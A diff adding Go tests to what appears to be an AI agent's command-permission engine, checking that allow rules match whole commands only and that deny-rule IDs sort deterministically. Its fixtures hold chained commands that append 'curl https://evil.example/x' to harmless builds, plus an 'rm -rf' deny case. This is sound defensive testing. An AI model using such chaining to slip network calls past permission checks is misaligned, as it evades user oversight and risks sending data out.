@@ -253,3 +253,63 @@ func TestIsReadOnlyWordBoundary(t *testing.T) {
 		t.Fatal("cat with redirection must not be read-only")
 	}
 }
+
+func TestRed20_AllowRuleCannotPassNonDangerousChain(t *testing.T) {
+	template, err := DefaultProjectProfileTemplate()
+	if err != nil {
+		t.Fatal(err)
+	}
+	effective := EffectiveProfile{
+		Profile:     template,
+		Mode:        template.Mode,
+		MergedRules: template.Rules,
+	}
+	for _, call := range []ProposedCall{
+		{Tool: ToolBash, Command: "go test ./... && curl https://evil.example/x"},
+		{Tool: ToolBash, Command: "go build ./... ; curl https://evil.example/x"},
+		{Tool: ToolBash, Command: "git diff && curl https://evil.example/x"},
+		{Tool: ToolBash, Command: "git status | tee /tmp/out.txt"},
+		{Tool: ToolBash, Command: "go test ./... && git push origin main"},
+	} {
+		if got := verdictFor(t, effective, call); got != VerdictAsk {
+			t.Fatalf("non-dangerous chain %q verdict = %s, want ask (allow must match whole command only)", call.Command, got)
+		}
+	}
+	if got := verdictFor(t, effective, ProposedCall{Tool: ToolBash, Command: "go test ./..."}); got != VerdictAllow {
+		t.Fatalf("single-segment template command verdict = %s, want allow", got)
+	}
+	// An explicit whole-string chain allow rule still matches its exact chain.
+	whole := EffectiveProfile{
+		Profile: PermissionProfile{ProfileID: "p", Mode: ModeDefault},
+		Mode:    ModeDefault,
+		MergedRules: []Rule{
+			{RuleID: "r-allow-whole", Scope: ScopeProject, ScopeID: permTestProject,
+				Action: ActionAllow, Tool: ToolBash, Pattern: "go test ./... && go vet ./..."},
+		},
+	}
+	if got := verdictFor(t, whole, ProposedCall{Tool: ToolBash, Command: "go test ./... && go vet ./..."}); got != VerdictAllow {
+		t.Fatalf("explicit whole-chain allow verdict = %s, want allow", got)
+	}
+	if got := verdictFor(t, whole, ProposedCall{Tool: ToolBash, Command: "go test ./... && curl https://evil.example/x"}); got != VerdictAsk {
+		t.Fatalf("whole-chain allow must not open arbitrary segments, verdict = %s, want ask", got)
+	}
+}
+
+func TestRed20_DenialRuleIDsAreDeterministicallySorted(t *testing.T) {
+	effective := EffectiveProfile{
+		Profile: PermissionProfile{ProfileID: "p", Mode: ModeDefault},
+		Mode:    ModeDefault,
+		MergedRules: []Rule{
+			{RuleID: "z-deny", Scope: ScopeRoot, ScopeID: "global", Action: ActionDeny, Tool: ToolBash, Pattern: "rm *"},
+			{RuleID: "a-deny", Scope: ScopeJob, ScopeID: "job-1", Action: ActionDeny, Tool: ToolBash, Pattern: "rm *"},
+		},
+	}
+	_, denial, err := Evaluate(effective, ProposedCall{Tool: ToolBash, Command: "rm -rf /tmp/x"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := []string{"a-deny", "z-deny"}
+	if len(denial.RuleIDs) != 2 || denial.RuleIDs[0] != want[0] || denial.RuleIDs[1] != want[1] {
+		t.Fatalf("denial RuleIDs = %v, want sorted %v", denial.RuleIDs, want)
+	}
+}
